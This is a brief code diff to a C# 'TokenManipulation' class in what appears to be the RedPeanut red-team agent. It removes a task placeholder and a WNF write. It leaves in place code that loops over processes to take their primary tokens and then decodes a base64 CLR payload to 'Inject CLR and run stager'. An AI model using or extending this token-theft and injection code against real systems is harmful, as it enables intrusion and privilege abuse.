@@ -14,7 +14,6 @@ using static RedPeanutAgent.Execution.WnfHelper;
 class TokenManipulation
 {
     static private string nutclr = "#NUTCLR#";
-    static private string task = "#TASK#";
     static private string binary = "#BINARY#";
     static private string arguments = "#ARGUMENTS#";
     static private string path = "#PATH#";
@@ -51,9 +50,7 @@ class TokenManipulation
         foreach (Process process in processes)
         {
             // Get PrimaryToken
-
-            WriteWnF(task);
-
+            
             //Inject CLR and run stager
             byte[] payload = DecompressDLL(Convert.FromBase64String(nutclr));
 
